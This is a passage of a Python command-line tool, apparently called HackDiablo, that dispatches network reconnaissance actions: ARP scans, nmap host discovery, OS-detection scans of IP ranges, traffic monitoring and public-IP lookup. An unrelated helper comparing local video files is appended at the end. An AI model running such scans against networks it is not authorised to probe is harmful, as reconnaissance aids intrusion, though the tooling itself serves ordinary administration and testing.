    if action not in ACTION_DICT:
        actions = [f"{x}:\t{k}" for x,k in ACTION_DICT.items()]
        logger.error(f"[main] invalid action specified, available actions:\n\t- {'\n\t- '.join(actions)}\n")
        sys.exit(1)

    # Execute action
    log_msg = f"[main] performing action \'{action}\'"
    if (len(action_args_list)):
        log_msg += f" with the following arguments: {' ,'.join(action_args_list)}"
    logger.info(log_msg)

    # HackDiablo setup
    hd = HackDiablo(working_dir=working_dir, verbose=is_verbose, logger=logger)

    if action in ['arpscan', 'scan', 'hostdiscovery']:
        t_0 = time.time()

        # allow for user to specify IP range of scan, otherwise default to local IP range
        if len(action_args_list) >= 1:
            target_ip_range = action_args_list[0]
        else:
            target_ip_range = hd.ip_range

        if action == 'arpscan':
            arp_scan_data = hd.arp_scan(target_ip_range)
            for host in sorted(arp_scan_data, key=lambda x: ipaddress.IPv4Address(x.get('ip_address'))):
                logger.info(f"Host: {host.get('ip_address')},\tMAC: {host.get('mac_address')}")

        if action == 'hostdiscovery':
            # nmap_args = "-n -sP" # OLD VERSION
            nmap_args = "-sn"
            nmap_scan_data = hd.nmap_scan(target=target_ip_range, arguments=nmap_args, do_sudo=False)
            for host in sorted(nmap_scan_data, key=lambda x: ipaddress.IPv4Address(x.get('ip_address'))):
                logger.info(f"Host: {host.get('hostname') or host.get('ip_address')},\tState: {host.get('state')},\tProtocols: {list(host.get('protocols', {}).keys())}")

        if action == 'scan':
            scan_results = hd.os_detection_scan(target_range=target_ip_range)
            for host in sorted(scan_results.values(), key=lambda x: ipaddress.IPv4Address(x.get('ip_address'))):
                # logger.info(f"Host: {host.get('hostname') or host.get('ip_address')},\tState: {host.get('state')},\tOS Matches: {len(host.get('osmatches', []))}")
                logger.info(f"Host: {host.get('hostname') or host.get('ip_address')},\tState: {host.get('state')},\tOS Matches ({len(host.get('osmatches', []))}): {[(x.get('name'), x.get('accuracy')) for x in host.get('osmatches', [])]}")

        if do_export:
            data_exported = hd.export_data(filename=f'{_APP_NAME}-{action}', verbose=is_verbose)

    elif action == 'monitor':
        t_0 = time.time()

        t_duration = int(action_args_list[0]) if len(action_args_list) >= 1 else time_duration
        result_filepath = hd.monitor(t_duration_secs=t_duration)

    elif action == 'pi':
        rpc = RPC()
        if not rpc.is_raspberry_pi:
            logger.error("[main] Raspberry PI specific features requested, but this system is not a Raspberry Pi.")
            sys.exit(1)

        t_duration = None
        if len(action_args_list) >= 1:
            t_duration = int(action_args_list[0])

        t_interval = DEFAULT_INTERVAL_SEC
        if len(action_args_list) >= 2:
            t_interval = int(action_args_list[1])
        rpc.capture(time_seconds=t_duration, interval_seconds=t_interval)
        sys.exit()

    # assuming IPv4
    elif action == 'getip':
        t_0 = time.time()
        ip_address = action_args_list[0] if len(action_args_list) >= 1 else None
        out_data: dict = dict()
        if ip_address is not None:
            results = hd.get_public_ip(ip_address=ip_address)
            out_data['results'] = results

        logger.info(f"HOSTNAME:{hd.hostname};LOCAL_IP_ADDRESS:{hd.ip_address};PUBLIC_IP_ADDRESS:{hd.public_ip_address}")
        out_data.update({
            "hostname": hd.hostname,
            "ip_address": hd.ip_address,
            "public_ip_address": hd.public_ip_address,
        })
        datetime_str = datetime.datetime.now(datetime.UTC).strftime('%Y%m%d%H%M%S')
        filename = f"{datetime_str}--{_APP_NAME}--current_host.json"
        data_exported = hd.export_data(filename=filename, data=out_data, verbose=False)

    # print completion time for action
    if t_0:
        t_total_secs = int(str(time.time() - t_0).split('.')[0])
        t_mins = floor(t_total_secs / 60) if t_total_secs >=60 else 0
        t_secs = floor(t_total_secs % 60) if t_total_secs >= 60 else t_total_secs
        t_string = f"{t_mins:02}:{t_secs:02}"
        logger.info(f"action \'{action}\' completed in {t_string}")
    sys.exit(0)


def iterate_stuff():

    from pathlib import Path
    import re
    RE_VID=r"^.*--(?P<uid>[^\.]*)\.\w{3}$"

    v_path = Path('/Volumes/djs/media/xxx/videos/')
    l_path = Path('/Users/santander/Movies/omg/')

    v_uid_set = set([re.match(RE_VID, x.name).group('uid') for x in v_path.iterdir() if re.match(RE_VID, x.name)])
    l_uid_set = set([re.match(RE_VID, x.name).group('uid') for x in l_path.iterdir() if re.match(RE_VID, x.name)])

    all_vid_files = set()
    all_vid_files.update(v_path.iterdir())
    all_vid_files.update(l_path.iterdir())

    # Returns True if they share at least one element
    v_contains_l = not v_uid_set.isdisjoint(l_uid_set)
    if v_contains_l:
        print("The sets share at least one common UID.")
    if v_uid_set & l_uid_set:
        print("Sets have common elements")
        # print("The sets share at least one common UID.")

    missing_from_v = l_uid_set - v_uid_set
    missing_from_v = l_uid_set.difference(v_uid_set)

    missing_from_l = v_uid_set - l_uid_set
    missing_from_l = v_uid_set.difference(l_uid_set)

    print(f"Num missing files from V: {len(missing_from_v)}")
    print(f"Num missing files from L: {len(missing_from_l)}")

